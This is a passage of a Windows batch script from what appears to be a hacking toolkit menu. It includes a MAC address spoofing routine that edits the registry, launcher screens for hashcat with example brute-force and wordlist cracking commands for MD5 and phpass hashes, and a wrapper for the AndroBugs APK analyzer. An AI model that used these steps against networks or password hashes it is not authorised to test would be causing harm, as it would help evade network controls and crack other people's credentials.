			call colorchar.exe /0c " An Interface must be selected for MAC Spoofing..."
			timeout /t 3 >nul
			set interfacemanagementchoice=
			cls
			goto :skip_interface_management_check

		)


		call :mac_spoofing
		set interfacemanagementchoice=
		cls
		goto :skip_interface_management_check

	)


	call colorchar.exe /0c " Invalid input"
	echo.
	timeout /t 2 >nul
	cls
	set interfacemanagementchoice=
	goto :skip_interface_management_check










	:mac_spoofing

	if "!privilege_level!"=="local" (
		echo.
		call colorchar.exe /0c " Administrator Privileges required to use this feature..."
		timeout /t 3 >nul
		cls
		set interfacemanagementchoice=
		goto :skip_interface_management_check
	)
	cls
	echo.
	call colorchar.exe /0b " MAC Spoofing"
	echo.
	echo.
	echo  [--------------------------------------------------------------------------------------------------------------------------]
	call colorchar.exe /0b "   Interface: "
	call colorchar.exe /0e "!interface_description!"
	echo.
	call colorchar.exe /0b "   MAC: "
	call colorchar.exe /08 "!interface_mac!"
	echo.
	echo.
	echo  [--------------------------------------------------------------------------------------------------------------------------]
	call colorchar.exe /0b "    MAC Spoofing Commands"
	echo.
	echo.
	echo    - revert            : Revert MAC address to original
	echo    - randomize mac     : Randomize MAC Address
	echo    - exit              : Exit MAC Spoofing screen
	echo.
	echo  [--------------------------------------------------------------------------------------------------------------------------]
	echo.
	call colorbox.exe /0f 1 3 125 6

	call :userinput
	set /p macspoofingchoice=



	if "!macspoofingchoice!"=="exit" (
		set macspoofingchoice=
		cls
		goto :skip_interface_management_check

	)



	if "!macspoofingchoice!"=="revert" (

		if !interface_mac_changed!==false (
		echo.
		call colorchar.exe /0c " !interface_description! is already has Original Static MAC..."
		timeout /t 3 >nul
		set macspoofingchoice=
		cls
		goto :mac_spoofing
		)
		echo.
		echo  Disabling "!interface_description!"...
		netsh interface set interface name="!interface_id!" admin=disabled >nul
		echo  Reverting MAC Address...
		reg delete !interface_registry_location! /v NetworkAddress /f >nul
		echo  Enabling "!interface_description!"...
		netsh interface set interface name="!interface_id!" admin=enabled >nul
		call colorchar.exe /0a " Completed."
		timeout /t 3 >nul
		set macspoofingchoice=
		cls
		goto :interface_management



	)






	if "!macspoofingchoice!"=="randomize mac" (
		echo.
		echo  Generating a random MAC Address...
		call :mac_randomizer
		echo.
		call colorchar.exe /0f " Generated: "
		call colorchar.exe /0a "!set_mac!"
		echo.
		echo  Disabling "!interface_description!"...
		netsh interface set interface name="!interface_id!" admin=disabled >nul
		echo  Applying new MAC Address...
		reg add !interface_registry_location! /v NetworkAddress /t REG_SZ /d "!set_mac!"
		echo  Enabling "!interface_description!"...
		netsh interface set interface name="!interface_id!" admin=enabled >nul
		call colorchar.exe /0a " Completed."
		timeout /t 3 >nul
		set macspoofingchoice=
		cls
		goto :interface_management
	)



	echo.
	call colorchar.exe /0c " Invalid input"
	echo.
	timeout /t 2 >nul
	set macspoofingchoice=
	cls
	goto :mac_spoofing



	:hashcat64
	cls
	cd BF_Files
	cd hashcat
	start hashcat64.exe -h
	echo.
	call colorchar.exe /A "[========================================hashcat========================================]"
	echo.
	call colorchar.exe /0e "please do not mention hashcat before writting ur command"
	echo.
	call colorchar.exe /0a "hashcat is default u can directly write ur code"
	echo.
	call colorchar.exe /0d "use the tool if u know how to use it cause its fast"
	echo.
	call colorchar.exe /0g "EXAMPLE" 
	echo.
	call colorchar.exe /A "  Attack-          | Hash- |"
	echo.
	call colorchar.exe /A "  Mode             | Type  | Example command"
	echo.
	call colorchar.exe /A " ==================+=======+=================================================================="
	echo.
	call colorchar.exe /A "  Wordlist         | $P$   | -a 0 -m 400 '.hash path' '.hash path'"
	echo.
	call colorchar.exe /A "  Wordlist + Rules | MD5   | -a 0 -m 0 '.hash path' '.hash path' -r rules/best64.rule"
	echo.
	call colorchar.exe /A "  Brute-Force      | MD5   | -a 3 -m 0 '.hash path' ?a?a?a?a?a?a"
	echo.
	call colorchar.exe /A "  Combinator       | MD5   | -a 1 -m 0 '.hash path' '.hash path'"
	echo.
	set /p hashcat64="enter ur commands :"
	echo.
	start hashcat64.exe %hashcat64%
	pause
	goto :hashcat64
  

	:hashcat32
	cls
	cd BF_Files
	cd hashcat
	start hashcat32.exe -h
	echo.
	call colorchar.exe /A "[========================================hashcat========================================]"
	echo.
	call colorchar.exe /0e "please do not mention hashcat before writting ur command"
	echo.
	call colorchar.exe /0a "hashcat is default u can directly write ur code"
	echo.
	call colorchar.exe /0d "use the tool if u know how to use it cause its fast"
	echo.
	call colorchar.exe /0g "EXAMPLE" 
	echo.
	call colorchar.exe /A "  Attack-          | Hash- |"
	echo.
	call colorchar.exe /A "  Mode             | Type  | Example command"
	echo.
	call colorchar.exe /A " ==================+=======+=================================================================="
	echo.
	call colorchar.exe /A "  Wordlist         | $P$   | -a 0 -m 400 '.hash path' '.hash path'"
	echo.
	call colorchar.exe /A "  Wordlist + Rules | MD5   | -a 0 -m 0 '.hash path' '.hash path' -r rules/best64.rule"
	echo.
	call colorchar.exe /A "  Brute-Force      | MD5   | -a 3 -m 0 '.hash path' ?a?a?a?a?a?a"
	echo.
	call colorchar.exe /A "  Combinator       | MD5   | -a 1 -m 0 '.hash path' '.hash path'"
	echo.
	set /p hashcat32="enter ur commands :"
	echo.
	start hashcat32.exe %hashcat32%
	pause
	goto :hashcat32

	:androidbug_framework
	cls
	cd brute-v-7
	cd BF_Files
	cd AndroBugs_Framework
	start androbugs.exe -h
	echo.
	call colorchar.exe /A "[========================================androidbug_framework========================================]"
	echo.
	call colorchar.exe /b "optional arguments:"
	echo.
	call colorchar.exe /c "  -h, --help            show this help message and exit"
	echo.
	call colorchar.exe /d "  -f APK_FILE, --apk_file APK_FILE"
	echo.
	call colorchar.exe /e "                        APK File to analyze"
	echo.
	call colorchar.exe /f "  -m ANALYZE_MODE, --analyze_mode ANALYZE_MODE"
	echo.
	call colorchar.exe /g "                        Specify "single"(default) or "massive"
	echo.
	call colorchar.exe /h "  -b ANALYZE_ENGINE_BUILD, --analyze_engine_build ANALYZE_ENGINE_BUILD"
	echo.
	call colorchar.exe /i "                        Analysis build number."
	echo.	
	call colorchar.exe /j "  -t ANALYZE_TAG, --analyze_tag ANALYZE_TAG"
	echo.
	call colorchar.exe /k "                        Analysis tag to uniquely distinguish this time of"
	echo.
	call colorchar.exe /l "                        analysis."
	echo.
	call colorchar.exe /m "  -e EXTRA, --extra EXTRA"
	echo.
	call colorchar.exe /n "                        1)Do not check(default) 2)Check security class names,"
	echo.
	call colorchar.exe /o "                        method names and native methods"
	echo.
	call colorchar.exe /p "  -c LINE_MAX_OUTPUT_CHARACTERS, --line_max_output_characters LINE_MAX_OUTPUT_CHARACTERS"
	echo.
	call colorchar.exe /q "                        Setup the maximum characters of analysis output in a"
	echo.
	call colorchar.exe /r "                        line"
	echo.
	call colorchar.exe /s "  -s, --store_analysis_result_in_db"
	echo.
	call colorchar.exe /t "                        Specify this argument if you want to store the"
	echo.
	call colorchar.exe /u "                        analysis result in MongoDB. Please add this argument"
	echo.
	call colorchar.exe /v "                        if you have MongoDB connection."
	echo.
	call colorchar.exe /w "  -v, --show_vector_id  Specify this argument if you want to see the Vector ID"
	echo.
	call colorchar.exe /x "                        for each vector."
	echo.
	call colorchar.exe /y "  -o REPORT_OUTPUT_DIR, --report_output_dir REPORT_OUTPUT_DIR"
	echo.
	call colorchar.exe /z "                        Analysis Report Output Directory"
	echo.	
	set /p android="enter ur commands :"
	echo.
	start androbugs.exe %android%
	pause
	goto :androidbug_framework
	